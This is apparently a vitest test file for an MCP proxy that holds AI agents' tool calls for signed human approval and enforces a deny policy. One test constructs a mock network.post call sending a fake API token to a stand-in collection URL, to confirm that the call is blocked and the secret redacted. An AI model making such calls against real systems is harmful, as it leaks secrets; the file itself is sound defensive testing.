import { describe, expect, it } from "vitest";
import { createUnsignedApprovalToken, signApprovalToken, type CreateUnsignedApprovalTokenInput } from "@agentshield/core";

import { McpProxySession } from "../proxy/mcpProxySession.js";
import { defaultProxyDemoPolicy } from "../proxy/mcpProxy.js";

const writeRequest = {
  jsonrpc: "2.0" as const,
  id: "write",
  method: "tools/call",
  params: {
    name: "filesystem.write",
    arguments: { path: "/mock/project/out.txt", content: "safe mock content" }
  }
};

function session() {
  return new McpProxySession({
    config: {
      mode: "mock",
      maxMessageBytes: 1024 * 1024,
      allowMethods: ["initialize", "initialized", "ping", "tools/list", "tools/call"]
    },
    policy: defaultProxyDemoPolicy(),
    sessionId: "mcp_proxy_demo",
    approvalSigningKey: "fake-local-test-key",
    now: () => new Date("2026-06-26T00:00:00.000Z")
  });
}

describe("MCP approval integration", () => {
  it("does not forward without approval and returns ticket summary", () => {
    const proxy = session();
    const response = proxy.handle(writeRequest);

    expect(proxy.forwardedCallCount).toBe(0);
    expect(response.error?.data).toMatchObject({
      decision: "require_human_review",
      approvalStatus: "required",
      approvalTicket: expect.objectContaining({ actionId: "write" })
    });
  });

  it("forwards with valid approval only for permitted review action", () => {
    const first = session().handle(writeRequest);
    const ticket = (first.error!.data as { approvalTicket: unknown }).approvalTicket;
    const token = signApprovalToken(
      createUnsignedApprovalToken({
        ticket: ticket as CreateUnsignedApprovalTokenInput["ticket"],
        approvedDecision: "allow",
        approver: "local-dev",
        reason: "Reviewed local mock action",
        issuedAt: "2026-06-26T00:00:01.000Z"
      }),
      "fake-local-test-key"
    );
    const proxy = session();
    const response = proxy.handle({
      ...writeRequest,
      params: {
        ...writeRequest.params,
        _meta: { approvalToken: token }
      }
    });

    expect(response.result).toMatchObject({ decision: "allow", approvalStatus: "approved" });
    expect(proxy.forwardedCallCount).toBe(1);
  });

  it("does not forward with invalid, expired, or mismatched token", () => {
    const first = session().handle(writeRequest);
    const ticket = (first.error!.data as { approvalTicket: unknown }).approvalTicket as CreateUnsignedApprovalTokenInput["ticket"];
    const unsigned = createUnsignedApprovalToken({
      ticket,
      approvedDecision: "allow",
      approver: "local-dev",
      reason: "Reviewed",
      issuedAt: "2026-06-26T00:00:01.000Z"
    });
    const tokens = [
      { ...signApprovalToken(unsigned, "fake-local-test-key"), signature: "0".repeat(64) },
      signApprovalToken({ ...unsigned, expiresAt: "2026-06-25T00:00:00.000Z" }, "fake-local-test-key"),
      signApprovalToken({ ...unsigned, actionHash: "other_hash" }, "fake-local-test-key")
    ];

    for (const token of tokens) {
      const proxy = session();
      const response = proxy.handle({
        ...writeRequest,
        params: {
          ...writeRequest.params,
          _meta: { approvalToken: token }
        }
      });

      expect(response.error).toBeDefined();
      expect(proxy.forwardedCallCount).toBe(0);
    }
  });

  it("approval cannot make policy-denied tool forward", () => {
    const first = session().handle(writeRequest);
    const ticket = (first.error!.data as { approvalTicket: unknown }).approvalTicket as CreateUnsignedApprovalTokenInput["ticket"];
    const token = signApprovalToken(
      createUnsignedApprovalToken({
        ticket,
        approvedDecision: "allow",
        approver: "local-dev",
        reason: "Reviewed",
        issuedAt: "2026-06-26T00:00:01.000Z"
      }),
      "fake-local-test-key"
    );
    const proxy = session();
    const response = proxy.handle({
      jsonrpc: "2.0",
      id: "network",
      method: "tools/call",
      params: {
        name: "network.post",
        arguments: { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" },
        _meta: { approvalToken: token }
      }
    });

    expect(response.error?.data).toMatchObject({ decision: "deny" });
    expect(proxy.forwardedCallCount).toBe(0);
    expect(JSON.stringify(response)).not.toContain("sk-test-REDACT-ME");
  });
});
